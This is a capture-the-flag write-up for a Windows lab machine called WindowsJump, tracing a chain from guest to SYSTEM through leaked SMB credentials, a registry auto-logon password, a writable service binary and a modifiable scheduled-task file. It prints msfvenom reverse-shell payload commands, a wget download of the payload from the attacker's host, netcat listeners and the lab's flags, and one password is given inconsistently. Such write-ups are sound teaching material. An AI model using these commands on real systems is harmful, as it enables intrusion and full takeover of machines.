@@ -1,1 +1,183 @@
+# 🧩 **WindowsJump — CTF‑Style Write‑Up
+
+## **1. Overview**
+*WindowsJump* is a Windows‑based CTF machine designed around **sequential lateral movement** through multiple local accounts, each exposing a small misconfiguration that enables the next escalation step.
+
+The full privilege‑escalation chain is:
+**guest → thmuser → notadmin → svcadmin → SYSTEM**
+
+---
+
+# **2. Initial Access (Foothold)**
+
+### **Enumeration**
+I began with a standard service scan:
+```
+nmap -sV -p- -T 4 10.49.186.249
+```
+
+Three interesting ports were exposed:
+- **139** — NetBIOS  
+- **445** — SMB  
+- **3389** — RDP  
+
+Since SMB was open, I attempted to enumerate shares anonymously:
+```
+smbclient -L //10.49.186.249/ -N
+```
+A publicly accessible share was available.  
+After connecting and performing basic enumeration, I discovered credentials stored inside the share:
+
+- **Username:** `thmuser`  
+- **Password:** `Password1!`
+
+### **Exploitation**
+Using these credentials, I connect to the RDP server:
+```
+ xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /u:thmuser /p:Password2! /v:10.49.186.249 /drive:share,/share
+```
+and gain access to "thmuser"
+
+------
+
+# **3. Pivot #1 — thmuser -> notadmin**
+
+### **Enumeration**
+I first checked for saved credentials:
+```
+cmdkey /list
+```
+No useful entries were present.
+
+Next, I queried the registry for stored logon information:
+```
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+The registry revealed a saved auto‑logon entry for:
+- **Username:** `notadmin`  
+- **Password:** `P@ssw0rd!`
+
+### **Exploitation**
+I used the credentials with:
+```
+runas /savecred /user:notadmin cmd.exe
+```
+After entering the password when prompted, I obtained a shell as:
+
+**notadmin**
+
+-------
+
+# **4. Pivot #2 — notadmin → svcadmin**
+
+### **Enumeration**
+upon enumerating services and their executable paths:
+```
+wmic service get name,displayname,pathname,startname
+```
+
+One service stood out — it ran as **svcadmin** and pointed to an unusual executable path:
+```
+C:\Windows\THMSVC\svc.exe
+```
+
+Checking permissions:
+```
+icacls C:\Windows\THMSVC\svc.exe
+```
+The file was **fully writable (F)** by my current user.
+
+### **Exploitation**
+I generated a malicious service‑compatible executable:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my_ip> LPORT=4444 -f exe-service -o rev_service.exe
+```
+
+I hosted it via a Python web server and downloaded it to the target.  
+Once transferred, I granted full permissions:
+```
+icacls rev_service.exe /grant everyone:F
+```
+
+Then replaced the original service binary:
+```
+move C:\Users\notadmin\rev_service.exe C:\Windows\THMSVC\svc.exe
+```
+
+With a listener running:
+```
+rlwrap nc -lvnp 4444
+```
+
+I started the service:
+```
+sc start THMSvc
+```
+
+This executed my payload and returned a shell as:
+**svcadmin**
+
+------
+
+# **5. Pivot #3 — svcadmin → SYSTEM**
+
+### **Enumeration**
+I enumerated scheduled tasks:
+
+```
+schtasks /query /fo list /v | findstr /R "^TaskName: ^Task To Run: ^Run As User:"
+```
+
+i noticed a task running as **SYSTEM** and poiting to an unsual binary path:
+```
+C:\Windows\Tasks\cleanup.bat
+```
+Checking permissions on the batch file revealed that **svcadmin had modification rights (M)**.
+
+### **Exploitation**
+
+I generated a SYSTEM‑level reverse shell payload:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my_ip> LPORT=5555 -f exe -o shell.exe
+```
+
+I hosted it and downloaded it to the target:
+```
+wget http://<my_ip>:8000/shell.exe -O C:\Users\svcadmin\shell.exe
+```
+
+Then granted full permissions:
+```
+icacls C:\Users\svcadmin\shell.exe /grant everyone:F
+```
+
+Finally, I replaced the scheduled task’s batch file content:
+```
+echo C:\Users\svcadmin\shell.exe > C:\Windows\Tasks\cleanup.bat
+```
+
+With a listener running:
+```
+nc -lvnp 5555
+```
+
+I waited for the scheduled task to execute, and it delivered a SYSTEM shell.
+I completed the chain with full control over the machine.
+-------
+# 7. **Flags**
+thmuser: THM{5mb_cr3d5_1n_th3_5h4r3}
+notadmin: THM{w1nl0g0n_cr3ds_3xp0s3d}
+svcadmin: THM{s3rv1c3_b1n4ry_h1j4ck3d}
+system: THM{t4sk_wr1t3_t0_SYST3M}
+
+---
+
+# **6. Lessons Learned**
+- SMB shares often leak sensitive credentials when misconfigured.  
+- Windows registry keys can expose stored auto‑logon passwords.  
+- Writable service binaries remain one of the most reliable Windows privilege escalation vectors.  
+- Scheduled tasks running as SYSTEM are extremely dangerous when their associated files are modifiable.  
+- Lateral movement in Windows often relies on chaining small misconfigurations rather than a single explooit.
 
